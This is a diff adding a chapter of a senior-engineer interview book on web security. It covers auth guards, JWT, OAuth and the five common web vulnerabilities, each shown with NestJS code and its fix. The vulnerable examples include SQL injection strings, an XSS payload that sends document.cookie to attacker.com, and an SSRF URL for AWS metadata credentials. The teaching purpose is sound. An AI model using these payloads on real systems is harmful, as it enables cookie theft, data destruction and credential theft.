@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chapter 22: Security — Authentication, Authorization, and Common Vulnerabilities — Hired: A Senior Engineer's Interview Playbook</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <a href="../index.html">
+        <div class="book-title">Hired</div>
+        <div class="book-subtitle">A Senior Engineer's Interview Playbook</div>
+      </a>
+    </div>
+    <nav>
+      <div class="nav-part">
+        <a href="../index.html">📖 Table of Contents</a>
+        <a href="../introduction.html">Introduction</a>
+        <a href="../about-author.html">About the Author</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Part 1 — The Human Side</div>
+        <a href="../part-1/chapter-1.html">Ch 1 · Tell Me About Yourself</a>
+        <a href="../part-1/chapter-2.html">Ch 2 · Non-Technical Questions</a>
+        <a href="../part-1/chapter-3.html">Ch 3 · Agile &amp; Code Culture</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Part 2 — Algorithms &amp; Data Structures</div>
+        <a href="../part-2/chapter-4.html">Ch 4 · Thinking About Algorithms</a>
+        <a href="../part-2/chapter-5.html">Ch 5 · Core Data Structures</a>
+        <a href="../part-2/chapter-6.html">Ch 6 · Beginner Algorithms</a>
+        <a href="../part-2/chapter-7.html">Ch 7 · Intermediate Algorithms</a>
+        <a href="../part-2/chapter-8.html">Ch 8 · Advanced Algorithms</a>
+        <a href="../part-2/chapter-9.html">Ch 9 · Algorithms by Domain</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Part 3 — Frontend Interviews</div>
+        <a href="../part-3/chapter-10.html">Ch 10 · Frontend Fundamentals</a>
+        <a href="../part-3/chapter-11.html">Ch 11 · JavaScript &amp; the Browser</a>
+        <a href="../part-3/chapter-12.html">Ch 12 · Frameworks &amp; Components</a>
+        <a href="../part-3/chapter-13.html">Ch 13 · CSS &amp; Layout</a>
+        <a href="../part-3/chapter-14.html">Ch 14 · Frontend Performance</a>
+        <a href="../part-3/chapter-15.html">Ch 15 · Frontend System Design</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Part 4 — Backend Interviews</div>
+        <a href="../part-4/chapter-16.html">Ch 16 · Backend Fundamentals</a>
+        <a href="../part-4/chapter-17.html">Ch 17 · API Design &amp; Architecture</a>
+        <a href="../part-4/chapter-18.html">Ch 18 · Databases</a>
+        <a href="../part-4/chapter-19.html">Ch 19 · Microservices</a>
+        <a href="../part-4/chapter-20.html">Ch 20 · Performance &amp; Observability</a>
+        <a href="../part-4/chapter-21.html">Ch 21 · CI/CD &amp; DevOps</a>
+        <a href="../part-4/chapter-22.html">Ch 22 · Security</a>
+        <a href="../part-4/chapter-23.html">Ch 23 · Node.js Deep Dive</a>
+        <a href="../part-4/chapter-24.html">Ch 24 · TypeScript Deep Dive</a>
+        <a href="../part-4/chapter-25.html">Ch 25 · Java Deep Dive</a>
+        <a href="../part-4/chapter-26.html">Ch 26 · C# Deep Dive</a>
+        <a href="../part-4/chapter-27.html">Ch 27 · Go Deep Dive</a>
+        <a href="../part-4/chapter-28.html">Ch 28 · PHP Deep Dive</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Part 5 — System Design</div>
+        <a href="../part-5/chapter-29.html">Ch 29 · System Design Approach</a>
+        <a href="../part-5/chapter-30.html">Ch 30 · Core Building Blocks</a>
+        <a href="../part-5/chapter-31.html">Ch 31 · Design Case Studies</a>
+        <a href="../part-5/chapter-32.html">Ch 32 · Architecture Patterns</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Part 6 — Interview Process</div>
+        <a href="../part-6/chapter-33.html">Ch 33 · AI-Assisted Interviews</a>
+        <a href="../part-6/chapter-34.html">Ch 34 · Offer &amp; Negotiation</a>
+      </div>
+      <div class="nav-part">
+        <div class="nav-part-title">Back Matter</div>
+        <a href="../back-matter/complexity-cheat-sheet.html">Complexity Cheat Sheet</a>
+        <a href="../back-matter/system-design-reference.html">System Design Reference</a>
+        <a href="../back-matter/backend-taxonomy.html">Backend Taxonomy</a>
+        <a href="../back-matter/recommended-reading.html">Recommended Reading</a>
+      </div>
+    </nav>
+  </aside>
+  <div class="content-wrapper"><main class="content">
+    <div class="chapter-header">
+      <div class="chapter-tag part-4">Part 4 · Chapter 22</div>
+      <h1>Security — Authentication, Authorization, and Common Vulnerabilities</h1>
+      <p class="chapter-intro">Security is the topic most developers skip until they get breached. In interviews, it immediately separates "developer" from "senior engineer."</p>
+    </div>
+
+    <div class="learn-box"><h4>What you'll learn</h4><ul>
+      <li>The crystal-clear distinction between authentication and authorization</li>
+      <li>JWT deep dive: structure, gotchas, refresh token rotation, and NestJS guard code</li>
+      <li>OAuth 2.0 and OpenID Connect flows with PKCE</li>
+      <li>SQL Injection, XSS, CSRF, SSRF, and IDOR — vulnerability, exploit, and fix for each</li>
+      <li>Password hashing, secrets management, and security headers</li>
+    </ul></div>
+
+    <p>"Security is the chapter most developers skip until they get breached. In interviews, it's the topic that immediately separates 'developer' from 'senior engineer.' Every engineering decision has security implications."</p>
+
+    <p>This chapter is not a comprehensive security course. It's the 20% of security knowledge that appears in 80% of senior engineering interviews, taught the right way: vulnerabilities demonstrated with real code, fixes shown immediately after, and clear principles you can articulate under pressure.</p>
+
+    <h2>1. The Big Idea: Authentication vs Authorization</h2>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> A hotel. Authentication is checking in at the front desk, showing your ID, and receiving a key card. The hotel now knows who you are. Authorization is what floors and rooms your key card can open. The executive lounge on floor 30 only opens for Platinum members. The key card being valid (authentication) doesn't mean you can go anywhere (authorization). These are two completely separate problems that beginners consistently conflate.
+    </div>
+
+    <div class="box key-term">
+      <strong>Authentication (AuthN):</strong> Verifying identity. Who are you? Mechanisms: username/password, OAuth, biometrics, MFA.<br><br>
+      <strong>Authorization (AuthZ):</strong> Verifying permissions. What are you allowed to do? Mechanisms: RBAC (role-based), ABAC (attribute-based), ACLs, ownership checks.
+    </div>
+
+    <p><strong>NestJS: Authentication guard followed by Authorization guard — two separate layers:</strong></p>
+
+<pre><code>// auth/jwt.guard.ts — Authentication: verifies the token is valid and sets req.user
+import { Injectable, ExecutionContext, UnauthorizedException } from '@nestjs/common';
+import { AuthGuard } from '@nestjs/passport';
+
+@Injectable()
+export class JwtAuthGuard extends AuthGuard('jwt') {
+  handleRequest(err: any, user: any) {
+    if (err || !user) {
+      throw new UnauthorizedException('Invalid or missing token');
+    }
+    return user; // Sets req.user for downstream handlers
+  }
+}
+
+// auth/roles.guard.ts — Authorization: verifies the authenticated user has permission
+import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
+import { Reflector } from '@nestjs/core';
+
+@Injectable()
+export class RolesGuard implements CanActivate {
+  constructor(private reflector: Reflector) {}
+
+  canActivate(context: ExecutionContext): boolean {
+    const requiredRoles = this.reflector.get&lt;string[]&gt;('roles', context.getHandler());
+    if (!requiredRoles) return true; // No role restriction on this route
+
+    const { user } = context.switchToHttp().getRequest();
+    const hasRole = requiredRoles.some(role =&gt; user.roles?.includes(role));
+
+    if (!hasRole) {
+      throw new ForbiddenException('Insufficient permissions'); // 403, not 401
+    }
+    return true;
+  }
+}
+
+// Controller: authentication first, then authorization
+@Controller('admin')
+@UseGuards(JwtAuthGuard, RolesGuard)   // Order matters: JwtAuthGuard runs first
+export class AdminController {
+  @Get('users')
+  @SetMetadata('roles', ['admin'])
+  getAllUsers() { /* ... */ }
+}</code></pre>
+
+    <div class="box warning">
+      <strong>Common mistake:</strong> Returning 401 Unauthorized when the user is authenticated but lacks permission. The correct response for insufficient permissions is <strong>403 Forbidden</strong>. 401 means "you need to authenticate." 403 means "you're authenticated but not allowed."
+    </div>
+
+    <h2>2. JWT Deep Dive</h2>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> A signed permission slip from school. The school (authentication server) writes "Student A is allowed to attend the field trip" and stamps it with the school's official seal. Any teacher can verify the seal is real without calling the school — they just check the stamp. That's a JWT: a self-contained, verifiable credential. No database lookup required to verify it.
+    </div>
+
+    <p>A JWT has three base64url-encoded parts separated by dots: <code>header.payload.signature</code>.</p>
+
+    <ul>
+      <li><strong>Header:</strong> algorithm (<code>alg</code>) and type (<code>typ: "JWT"</code>)</li>
+      <li><strong>Payload:</strong> claims — <code>sub</code> (subject/user ID), <code>iat</code> (issued at), <code>exp</code> (expiry), custom claims like <code>roles</code></li>
+      <li><strong>Signature:</strong> HMAC-SHA256 or RSA signature over header + payload. Tamper-evident.</li>
+    </ul>
+
+    <div class="box warning">
+      <strong>JWTs are encoded, NOT encrypted.</strong> The payload is readable by anyone. Never put passwords, credit card numbers, or PII in a JWT payload. Only put data you're comfortable being public: user ID, roles, expiry.
+    </div>
+
+    <p><strong>Critical JWT gotchas that interviewers test:</strong></p>
+
+    <ul>
+      <li><strong><code>algorithm: "none"</code> vulnerability:</strong> Some early libraries accepted an unsigned JWT if the header declared <code>alg: none</code>. Always validate the algorithm server-side. Only accept the algorithms you explicitly configured.</li>
+      <li><strong>RS256 &gt; HS256 for distributed systems:</strong> HS256 uses a shared secret — every service that validates tokens must know the secret. RS256 uses a key pair: the auth server signs with the private key; any service verifies with the public key. Safer key distribution.</li>
+      <li><strong>Short expiry + refresh token:</strong> Access tokens should expire in 15 minutes. Refresh tokens (7–30 days) issue new access tokens without re-login.</li>
+      <li><strong>httpOnly cookies, not localStorage:</strong> Storing JWTs in localStorage exposes them to XSS. Store in <code>httpOnly</code>, <code>Secure</code>, <code>SameSite=Strict</code> cookies — JavaScript cannot read them.</li>
+      <li><strong>Revocation problem:</strong> You can't invalidate a JWT before it expires without a server-side blocklist (which reintroduces a database lookup, reducing the stateless benefit). Keep access tokens short-lived to limit damage from leaked tokens.</li>
+    </ul>
+
+    <p><strong>Full NestJS JWT guard with refresh token rotation:</strong></p>
+
+<pre><code>// auth/auth.service.ts
+import { Injectable } from '@nestjs/common';
+import { JwtService } from '@nestjs/jwt';
+import * as bcrypt from 'bcrypt';
+
+@Injectable()
+export class AuthService {
+  constructor(
+    private jwtService: JwtService,
+    private userRepository: UserRepository,
+    private refreshTokenRepository: RefreshTokenRepository,
+  ) {}
+
+  async login(email: string, password: string) {
+    const user = await this.userRepository.findByEmail(email);
+    if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
+      throw new UnauthorizedException('Invalid credentials');
+    }
+
+    return this.issueTokenPair(user.id, user.roles);
+  }
+
+  async refreshTokens(refreshToken: string) {
+    const stored = await this.refreshTokenRepository.findByToken(refreshToken);
+    if (!stored || stored.expiresAt &lt; new Date()) {
+      throw new UnauthorizedException('Refresh token invalid or expired');
+    }
+
+    // Rotation: invalidate the used refresh token immediately (prevents replay)
+    await this.refreshTokenRepository.delete(stored.id);
+
+    return this.issueTokenPair(stored.userId, stored.roles);
+  }
+
+  private async issueTokenPair(userId: string, roles: string[]) {
+    const accessToken = this.jwtService.sign(
+      { sub: userId, roles },
+      { expiresIn: '15m', algorithm: 'RS256' }
+    );
+
+    const refreshToken = crypto.randomUUID();
+    await this.refreshTokenRepository.save({
+      token: refreshToken,
+      userId,
+      roles,
+      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
+    });
+
+    return { accessToken, refreshToken };
+  }
+}</code></pre>
+
+    <h2>3. OAuth 2.0 and OpenID Connect</h2>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> You want to get into an exclusive nightclub. The club doesn't know who you are. But the government does — they issued your passport. You show the nightclub your government-issued ID. The nightclub verifies the ID is real (checks the signature) and lets you in. You never told the nightclub your address, bank account, or other personal details from your passport — only the minimum needed: your age and identity. OAuth 2.0 is this delegation: a trusted third party (Google, GitHub) vouches for you, and the app only gets the scopes (permissions) you explicitly grant.
+    </div>
+
+    <p><strong>Authorization Code with PKCE</strong> (the correct flow for web apps and SPAs):</p>
+    <ol>
+      <li>App generates a random <code>code_verifier</code> and hashes it to <code>code_challenge</code>.</li>
+      <li>User is redirected to the provider (Google) with <code>code_challenge</code> and requested scopes.</li>
+      <li>User authenticates with Google and grants permission.</li>
+      <li>Google redirects back with an authorization code.</li>
+      <li>App exchanges the code + <code>code_verifier</code> (the original random value) for tokens. PKCE prevents code interception attacks — a stolen code is useless without the verifier.</li>
+    </ol>
+
+    <p><strong>Client Credentials flow</strong> (machine-to-machine, no user involved): Service A sends its <code>client_id</code> and <code>client_secret</code> directly to the auth server and receives an access token. Used for microservice-to-microservice authentication.</p>
+
+    <div class="box key-term">
+      <strong>OpenID Connect (OIDC)</strong> adds identity to OAuth 2.0. OAuth 2.0 gives you an access token for APIs. OIDC additionally gives you an <strong>ID token</strong> (a JWT with the user's identity: name, email, picture). When you see "Sign in with Google," that's OIDC.
+    </div>
+
+    <h2>4. Common Vulnerabilities</h2>
+
+    <h3>SQL Injection</h3>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> The classic "Bobby Tables" comic. A school's database stores student names. A parent names their child <code>Robert'); DROP TABLE Students;--</code>. When the school's software does <code>"INSERT INTO Students (name) VALUES ('" + name + "'")</code>, the database executes the injected SQL. The student records are gone.
+    </div>
+
+<pre><code>// VULNERABLE: string concatenation — never do this
+async findUser_BAD(email: string) {
+  const query = `SELECT * FROM users WHERE email = '${email}'`;
+  // Attacker sends email = "' OR '1'='1" → returns ALL users
+  // Attacker sends email = "'; DROP TABLE users;--" → deletes users table
+  return this.db.query(query);
+}
+
+// SAFE: parameterized queries — the database treats the input as data, never as SQL
+async findUser_GOOD(email: string) {
+  return this.db.query('SELECT * FROM users WHERE email = $1', [email]);
+  // With TypeORM:
+  return this.userRepository.findOne({ where: { email } });
+  // With Prisma:
+  return this.prisma.user.findUnique({ where: { email } });
+}</code></pre>
+
+    <div class="box tip">
+      <strong>Defense:</strong> Always use parameterized queries or an ORM that parameterizes for you. Never concatenate user input into SQL strings. Apply the principle of least privilege — the database user your app connects with should only have the permissions it actually needs.
+    </div>
+
+    <h3>Cross-Site Scripting (XSS)</h3>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> A community library has a suggestion box. A malicious visitor leaves a "note" that is actually a script: "Whenever someone reads this note, automatically send me their library card number." The library staff posts the note on the public board. Every patron who reads the board executes the script without knowing it.
+    </div>
+
+<pre><code>// VULNERABLE: innerHTML with user-controlled content
+const userInput = '&lt;img src=x onerror="fetch(`https://attacker.com/?cookie=${document.cookie}`)"&gt;';
+element.innerHTML = userInput; // Executes the attacker's JavaScript in the victim's browser
+
+// SAFE: use textContent — treats input as text, not markup
+element.textContent = userInput; // Renders as literal text, harmless
+
+// SAFE: sanitize HTML if you genuinely need to render markup (e.g., rich text editors)
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);</code></pre>
+
+    <p><strong>Server-side defense — Content Security Policy header:</strong></p>
+
+<pre><code>// In your NestJS main.ts with Helmet:
+app.use(
+  helmet.contentSecurityPolicy({
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],   // No inline scripts, no external scripts
+      imgSrc: ["'self'", "data:", "https:"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+    },
+  })
+);</code></pre>
+
+    <h3>Cross-Site Request Forgery (CSRF)</h3>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> A criminal creates a forged document that looks like it came from your bank. They trick you into signing it by hiding it under a legitimate document. The bank, seeing your authentic signature, executes the transaction. CSRF tricks your browser into making authenticated requests to a legitimate site on your behalf, using your existing session cookie.
+    </div>
+
+<pre><code>// Prevention 1: SameSite cookie attribute — browser won't send cookie on cross-origin requests
+// In NestJS session/cookie config:
+{
+  sameSite: 'strict',  // 'strict' or 'lax' — prevents cross-site cookie sending
+  httpOnly: true,
+  secure: true,
+}
+
+// Prevention 2: CSRF token (for non-SameSite scenarios)
+// Server generates a random token, stores it in session, sends it in HTML form
+// Client must include it in every state-changing request
+// Attacker's forged form can't include the token (it's a secret only the legitimate page knows)</code></pre>
+
+    <h3>SSRF — Server-Side Request Forgery</h3>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> You hire an employee to fetch a document from a location you specify. Normally they fetch from the public library. An attacker tells them to fetch from the company's internal secret vault instead. The employee, being helpful, goes to the vault. SSRF tricks your server into making requests to internal infrastructure (AWS metadata endpoint, internal services) on the attacker's behalf.
+    </div>
+
+<pre><code>// VULNERABLE: fetching a user-provided URL without validation
+async fetchPreview_BAD(url: string) {
+  const response = await fetch(url);
+  // Attacker sends url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  // Your server fetches AWS IAM credentials and returns them to the attacker
+  return response.text();
+}
+
+// SAFE: validate against an allowlist of domains
+const ALLOWED_DOMAINS = ['api.trusted-partner.com', 'cdn.yourapp.com'];
+
+async fetchPreview_GOOD(url: string) {
+  const parsed = new URL(url); // Throws if URL is malformed
+  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
+    throw new BadRequestException('URL not in allowlist');
+  }
+  // Also block private IP ranges: 10.x, 172.16.x, 192.168.x, 169.254.x, ::1
+  const ip = await dns.resolve(parsed.hostname);
+  if (isPrivateIP(ip)) {
+    throw new BadRequestException('Internal addresses not permitted');
+  }
+  return fetch(url).then(r =&gt; r.text());
+}</code></pre>
+
+    <h3>IDOR — Insecure Direct Object Reference</h3>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> A coat check. You give your coat in and receive ticket number 42. You notice the tickets are sequential. You hand in ticket 41 and receive someone else's coat. The attendant checked that you had a valid ticket (authentication) but didn't check whether ticket 41 belongs to you (authorization). IDOR is checking authentication without checking ownership.
+    </div>
+
+<pre><code>// VULNERABLE: authenticates the user but doesn't check ownership
+@Get('documents/:id')
+@UseGuards(JwtAuthGuard)
+async getDocument_BAD(@Param('id') id: string) {
+  return this.documentRepository.findById(id);
+  // Any authenticated user can access any document by changing the ID in the URL
+}
+
+// SAFE: always verify the requesting user owns the resource
+@Get('documents/:id')
+@UseGuards(JwtAuthGuard)
+async getDocument_GOOD(@Param('id') id: string, @Request() req) {
+  const document = await this.documentRepository.findById(id);
+  if (!document) throw new NotFoundException();
+  if (document.ownerId !== req.user.sub) {
+    throw new ForbiddenException('Access denied');
+  }
+  return document;
+}</code></pre>
+
+    <h2>5. Password Hashing</h2>
+
+    <div class="box analogy">
+      <strong>Analogy:</strong> A one-way blender. You put strawberries in, you get a smoothie out. You cannot reconstruct the strawberries from the smoothie. A cryptographic hash function is the same — given a password, you produce a hash. You cannot reverse it to get the password back. When a user logs in, you hash their input and compare it to the stored hash.
+    </div>
+
+    <div class="box warning">
+      <strong>NEVER use MD5 or SHA-1 for passwords.</strong> They're fast — which is exactly wrong for passwords. Attackers can test billions of guesses per second. Use a slow, purpose-built password hash: bcrypt (cost factor 12+) or Argon2id (the current gold standard).
+    </div>
+
+<pre><code>import * as bcrypt from 'bcrypt';
+
+// Registration: hash before storing
+async registerUser(email: string, plainPassword: string) {
+  const COST_FACTOR = 12; // Each increment doubles the work. 12 = ~250ms on modern hardware.
+  const passwordHash = await bcrypt.hash(plainPassword, COST_FACTOR);
+  await this.userRepository.save({ email, passwordHash });
+  // plainPassword is never stored — not in DB, not in logs
+}
+
+// Login: compare in constant time (bcrypt.compare prevents timing attacks)
+async verifyPassword(plainPassword: string, storedHash: string): Promise&lt;boolean&gt; {
+  return bcrypt.compare(plainPassword, storedHash);
+  // Returns true if they match. Takes the same time whether the password is right or wrong.
+  // Never do: storedHash === bcrypt.hashSync(plain) — hash output varies per salt
+}
+
+// Argon2id (stronger, preferred for new systems):
+import * as argon2 from 'argon2';
+const hash = await argon2.hash(password, { type: argon2.argon2id });
+const valid = await argon2.verify(hash, password);</code></pre>
+
+    <h2>6. Secrets Management</h2>
+
+    <div class="box warning">
+      <strong>Never commit secrets to source control.</strong> This includes API keys, database passwords, JWT signing keys, and OAuth client secrets. GitHub's secret scanning catches many cases automatically, but the damage is done the moment a secret hits a public repo. Assume any committed secret is compromised.
+    </div>
+
+    <p><strong>The layered approach:</strong></p>
+
+    <ol>
+      <li><strong>Local development:</strong> <code>.env</code> file (in <code>.gitignore</code>). Use <code>dotenv</code> to load.</li>
+      <li><strong>CI/CD:</strong> Environment secrets stored in GitHub Actions Secrets / GitLab CI Variables. Never echoed to logs.</li>
+      <li><strong>Production:</strong> Kubernetes Secrets (base64 encoded, not encrypted by default — use a secrets operator or external secrets manager). AWS Secrets Manager, HashiCorp Vault, or GCP Secret Manager for serious workloads.</li>
+    </ol>
+
+<pre><code># .gitignore — always include these
+.env
+.env.local
+.env.production
+*.pem
+*.key
+
+# Verify no secrets are staged before committing:
+# npm install -g git-secrets
+# git secrets --install
+# git secrets --register-aws   # Scans for AWS key patterns
+
+# In NestJS — load from environment, never hardcode:
+@Module({
+  imports: [
+    ConfigModule.forRoot({ isGlobal: true }),
+    JwtModule.registerAsync({
+      inject: [ConfigService],
+      useFactory: (config: ConfigService) =&gt; ({
+        privateKey: config.get('JWT_PRIVATE_KEY'),  // Loaded from env, not hardcoded
+        signOptions: { algorithm: 'RS256', expiresIn: '15m' },
+      }),
+    }),
+  ],
+})</code></pre>
+
+    <h2>7. Security Headers with Helmet.js</h2>
+
+    <p>Security headers tell the browser how to behave when loading your application. A single line of Helmet middleware sets them all:</p>
+
+<pre><code>// main.ts
+import helmet from 'helmet';
+
+async function bootstrap() {
+  const app = await NestFactory.create(AppModule);
+
+  app.use(helmet()); // Applies all of the following and more:
+  // Content-Security-Policy: restricts sources for scripts, styles, media
+  // X-Frame-Options: DENY — prevents clickjacking via iframes
+  // Strict-Transport-Security: forces HTTPS for 1 year (HSTS)
+  // X-Content-Type-Options: nosniff — prevents MIME-type sniffing
+  // X-XSS-Protection: 1; mode=block — legacy XSS filter in older browsers
+  // Referrer-Policy: no-referrer — don't leak URLs to third parties
+
+  await app.listen(3000);
+}</code></pre>
+
+    <h2>Senior vs Junior</h2>
+
+    <p><strong>Question: "How would you secure a REST API?"</strong></p>
+
+    <div class="junior">
+      <span class="answer-label junior-label">Junior Answer</span>
+      "I'd add JWT authentication."
+    </div>
+
+    <div class="senior">
+      <span class="answer-label senior-label">Senior Answer</span>
+      "Security is layered — JWTs are just the start. Here's the full picture. At the transport layer, HTTPS everywhere — no exceptions, HSTS header to enforce it. At the input layer, validate every request body with class-validator and a global ValidationPipe; reject anything that doesn't match the expected schema rather than trying to sanitize it. Use a whitelist approach. At the data layer, parameterized queries everywhere — never string-concatenate user input into SQL. At the application layer, verify ownership on every resource access — never just check that the user is authenticated; also check they own that specific resource. Apply rate limiting with a library like Throttler to prevent brute force and DDoS. Serve Helmet.js headers to block clickjacking, MIME sniffing, and restrict script sources. At the dependency layer, run <code>npm audit</code> in CI and fail the build on high or critical vulnerabilities. At the operations layer, store secrets in a vault or environment variables — never in code. Audit log sensitive actions (login, permission changes, data exports). Rotate keys regularly. For high-sensitivity endpoints, add IP allowlisting or mutual TLS. MFA for administrative access."
+    </div>
+
+    <div class="exercises">
+      <h3>Practice Questions</h3>
+
+      <div class="exercise">
+        <span class="badge beginner">Beginner</span>
+        <p><strong>What is the difference between authentication and authorization? Give a real-world example of each.</strong></p>
+        <p>Authentication answers "Who are you?" — the process of verifying identity. Logging in with email and password is authentication. Authorization answers "What are you allowed to do?" — the process of checking permissions after identity is confirmed. A logged-in user being blocked from accessing the admin dashboard because they lack the <code>admin</code> role is authorization. Authentication always comes first; authorization checks are meaningless without knowing who the user is.</p>
+      </div>
+
+      <div class="exercise">
+        <span class="badge intermediate">Intermediate</span>
+        <p><strong>A user is accessing other users' documents via <code>GET /api/documents/456</code>. Write the fix in NestJS.</strong></p>
+        <p>This is an IDOR vulnerability — the route authenticates the user but doesn't verify they own the document. Fix:</p>
+<pre><code>@Get('documents/:id')
+@UseGuards(JwtAuthGuard)
+async getDocument(@Param('id') id: string, @Request() req) {
+  const document = await this.documentService.findById(id);
+
+  // Always check for existence first — don't leak whether a document exists
+  if (!document) {
+    throw new NotFoundException('Document not found');
+  }
+
+  // Authorization: verify ownership before returning data
+  if (document.ownerId !== req.user.sub) {
+    // Return 404 rather than 403 to avoid confirming the document exists
+    throw new NotFoundException('Document not found');
+  }
+
+  return document;
+}</code></pre>
+        <p>Returning 404 (not 403) for unauthorized access prevents information leakage — the attacker doesn't learn that document 456 exists and belongs to someone else.</p>
+      </div>
+
+      <div class="exercise">
+        <span class="badge advanced">Advanced</span>
+        <p><strong>Walk through discovering an IDOR vulnerability, writing a test that catches it, and fixing it in NestJS with proper ownership checks.</strong></p>
+
+        <p><strong>Step 1 — Discover the vulnerability.</strong> During a security review or pen test, you notice that <code>GET /api/documents/:id</code> returns a document for any authenticated user, regardless of who created it. Testing with two accounts confirms user B can read user A's private documents simply by guessing or enumerating IDs.</p>
+
+        <p><strong>Step 2 — Write a failing test that catches it.</strong></p>
+
+<pre><code">// documents/documents.controller.spec.ts
+describe('GET /api/documents/:id — IDOR protection', () =&gt; {
+  let app: INestApplication;
+  let userAToken: string;
+  let userBToken: string;
+  let userADocumentId: string;
+
+  beforeAll(async () =&gt; {
+    // Set up two users and a document belonging to User A
+    userAToken = await loginAs('user-a@test.com', 'password');
+    userBToken = await loginAs('user-b@test.com', 'password');
+    const { body } = await request(app.getHttpServer())
+      .post('/api/documents')
+      .set('Authorization', `Bearer ${userAToken}`)
+      .send({ title: 'Secret Document', content: 'Private content' });
+    userADocumentId = body.id;
+  });
+
+  it('allows the owner to read their document', async () =&gt; {
+    const response = await request(app.getHttpServer())
+      .get(`/api/documents/${userADocumentId}`)
+      .set('Authorization', `Bearer ${userAToken}`);
+    expect(response.status).toBe(200);
+    expect(response.body.title).toBe('Secret Document');
+  });
+
+  it('prevents non-owners from accessing the document (IDOR fix)', async () =&gt; {
+    // This test FAILS before the fix — it gets 200 instead of 404
+    const response = await request(app.getHttpServer())
+      .get(`/api/documents/${userADocumentId}`)
+      .set('Authorization', `Bearer ${userBToken}`);
+    expect(response.status).toBe(404); // Not 200, not 403
+  });
+});</code></pre>
+
+        <p><strong>Step 3 — Fix the vulnerability.</strong></p>
+
+<pre><code>// documents/documents.service.ts
+@Injectable()
+export class DocumentsService {
+  constructor(private readonly documentRepository: DocumentRepository) {}
+
+  // Old: finds by ID only — returns any document to any caller
+  // async findById(id: string): Promise&lt;Document&gt; {
+  //   return this.documentRepository.findOne({ where: { id } });
+  // }
+
+  // Fixed: findByIdAndOwner — the query itself enforces ownership at the DB level
+  async findByIdAndOwner(id: string, ownerId: string): Promise&lt;Document | null&gt; {
+    return this.documentRepository.findOne({
+      where: { id, ownerId },  // SQL: WHERE id = $1 AND owner_id = $2
+    });
+    // If the document exists but belongs to someone else, this returns null —
+    // identical to "document not found" from the caller's perspective
+  }
+}
+
+// documents/documents.controller.ts
+@Get(':id')
+@UseGuards(JwtAuthGuard)
+async getDocument(@Param('id') id: string, @Request() req): Promise&lt;Document&gt; {
+  const document = await this.documentsService.findByIdAndOwner(id, req.user.sub);
+  if (!document) {
+    throw new NotFoundException('Document not found');
+    // Intentionally 404 — don't confirm the document's existence to unauthorized callers
+  }
+  return document;
+}</code></pre>
+
+        <p><strong>Key principle:</strong> The ownership check is in the service query itself — not a conditional after the fetch. This is safer: the database filters out unauthorized records at the SQL level. Even if a developer later refactors the controller and forgets to add an ownership check, the service method still enforces it.</p>
+
+        <p><strong>Also add an integration test for admin access</strong>, if admins legitimately need to access all documents, use a separate endpoint (<code>/admin/documents/:id</code>) protected by a separate admin guard — don't weaken the ownership check on the user-facing endpoint.</p>
+      </div>
+    </div>
+
+    <div class="summary">
+      <h3>Chapter Summary</h3>
+      <ul>
+        <li>Authentication (who you are) and authorization (what you can do) are separate problems. Treat them with separate guards. Return 401 for authentication failure, 403 for authorization failure.</li>
+        <li>JWTs are encoded, not encrypted. Use RS256, keep access tokens short-lived (15 min), store in httpOnly cookies, and rotate refresh tokens on every use.</li>
+        <li>SQL Injection, XSS, CSRF, SSRF, and IDOR are the five vulnerabilities most commonly tested in senior interviews. Know the pattern: vulnerability, exploit, parameterized fix.</li>
+        <li>Never store plain-text passwords. Use bcrypt (cost 12+) or Argon2id. Never use MD5 or SHA-1 for passwords.</li>
+        <li>Secrets belong in environment variables and vaults — never in code or git history. Apply Helmet.js security headers. Run <code>npm audit</code> in CI.</li>
+      </ul>
+    </div>
+
+    <hr>
+    <p><strong>Next up:</strong> With security fundamentals solid, Chapter 23 goes deep on Node.js internals — the event loop, libuv, worker threads, and the performance characteristics that distinguish expert Node.js engineers.</p>
+
+    <div class="chapter-nav">
+      <a href="chapter-21.html"><span class="nav-label">← Previous</span><span class="nav-title">CI/CD &amp; DevOps</span></a>
+      <a href="chapter-23.html" class="next"><span class="nav-label">Next →</span><span class="nav-title">Node.js Deep Dive</span></a>
+    </div>
+  </main></div>
+</div>
+<button class="menu-btn" aria-label="Open menu">☰</button>
+<script src="../auth.js"></script><script src="../nav.js"></script>
+</body>
+</html>
